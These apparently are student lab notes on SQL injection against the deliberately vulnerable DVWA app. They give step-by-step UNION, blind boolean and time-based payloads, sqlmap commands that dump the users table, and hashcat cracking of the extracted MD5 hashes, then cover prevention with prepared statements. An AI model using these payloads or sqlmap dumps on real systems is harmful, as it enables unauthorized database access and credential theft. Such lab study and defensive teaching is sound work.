# SQL Injection Notes — Task 3

## What is SQL Injection?
SQL Injection (SQLi) is a web security vulnerability that allows attackers to interfere with the queries an application makes to its database. It can allow an attacker to view, modify, or delete data they should not be able to access.

---

## 1. Types of SQL Injection

| Type | Description |
|------|-------------|
| **Classic / In-band** | Results returned directly in the response |
| **Error-based** | Extracts data through database error messages |
| **Union-based** | Uses UNION to append extra query results |
| **Blind Boolean** | No output — infer data from true/false responses |
| **Blind Time-based** | Uses time delays to infer data |
| **Out-of-band** | Exfiltrates data via DNS/HTTP requests |

---

## 2. DVWA SQL Injection — Step by Step

### Target
`http://127.0.0.1/dvwa/vulnerabilities/sqli/`
Security Level: **Low**

### Step 1 — Test for Injection
Enter in the User ID field:
```
1
1'
1''
```
- `1'` causes a MySQL error → confirms SQLi vulnerability
- Error: `You have an error in your SQL syntax...`

### Step 2 — Determine Number of Columns
```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -   ← Error here means 2 columns
```

### Step 3 — Find Displayable Columns (UNION)
```sql
1' UNION SELECT NULL, NULL-- -
1' UNION SELECT 1, 2-- -
```
Numbers `1` and `2` appear in the output → both columns are displayable.

### Step 4 — Extract Database Info
```sql
' UNION SELECT database(), version()-- -
```
Output reveals: database name (`dvwa`) and MySQL version.

```sql
' UNION SELECT user(), @@datadir-- -
```
Reveals: current DB user and data directory.

### Step 5 — List All Databases
```sql
' UNION SELECT schema_name, NULL FROM information_schema.schemata-- -
```

### Step 6 — List Tables in dvwa Database
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'-- -
```
Tables found: `guestbook`, `users`

### Step 7 — List Columns in users Table
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
```
Columns: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`

### Step 8 — Extract Usernames and Passwords
```sql
' UNION SELECT user, password FROM users-- -
```

**Extracted Data:**
| Username | Password Hash (MD5) | Cracked |
|----------|---------------------|---------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

Crack hashes:
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt
# or use: https://crackstation.net
```

---

## 3. Blind SQL Injection (Boolean-based)

`http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/`

```sql
# True condition — page loads normally
1' AND 1=1-- -

# False condition — page changes/disappears
1' AND 1=2-- -

# Extract first character of database name
1' AND SUBSTRING(database(),1,1)='d'-- -

# Extract full database name character by character
1' AND SUBSTRING(database(),1,1)='d'-- -
1' AND SUBSTRING(database(),2,1)='v'-- -
1' AND SUBSTRING(database(),3,1)='w'-- -
1' AND SUBSTRING(database(),4,1)='a'-- -
```

---

## 4. Time-based Blind SQLi
```sql
1' AND SLEEP(5)-- -          # Delays 5 seconds if vulnerable
1' AND IF(1=1, SLEEP(5), 0)-- -
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)-- -
```

---

## 5. SQLMap — Automated Exploitation

```bash
# Basic scan
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low"

# List databases
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs

# Dump users table
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa -T users --dump
```

**Getting the session cookie:**
- Open DVWA in browser
- F12 → Application → Cookies → copy `PHPSESSID` value

---

## 6. Prevention — Prepared Statements

### Vulnerable Code (PHP)
```php
// VULNERABLE — user input directly in query
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($db, $query);
```

### Secure Code — Prepared Statements (PDO)
```php
// SECURE — parameterized query
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

### Secure Code — Prepared Statements (MySQLi)
```php
// SECURE — bind parameters
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);
$stmt->execute();
$result = $stmt->get_result();
```

### Why Prepared Statements Work
- The query structure is defined BEFORE user input is provided
- User input is treated as **data**, never as **SQL code**
- Even if user enters `' OR 1=1-- -`, it's treated as a literal string
- The database never executes the injected SQL

---

## 7. Additional Prevention Measures

| Measure | Description |
|---------|-------------|
| **Prepared Statements** | Primary defense — parameterize all queries |
| **Input Validation** | Whitelist allowed characters (digits only for IDs) |
| **Least Privilege** | DB user should only have SELECT, not DROP/ALTER |
| **WAF** | Web Application Firewall to detect/block SQLi patterns |
| **Error Handling** | Never display raw database errors to users |
| **ORM** | Use frameworks (Django ORM, Hibernate) that handle escaping |

```php
// Input validation example
if (!is_numeric($id)) {
    die("Invalid input");
}
$id = intval($id);  // Cast to integer
```

---

## Key Takeaways
- A single quote `'` is the most basic SQLi test
- UNION-based injection requires matching the number of columns
- `information_schema` is the key to enumerating databases, tables, columns
- Passwords stored as MD5 are easily cracked — use bcrypt/Argon2
- Prepared statements completely eliminate SQL injection risk
- SQLMap automates the entire process — always test manually first
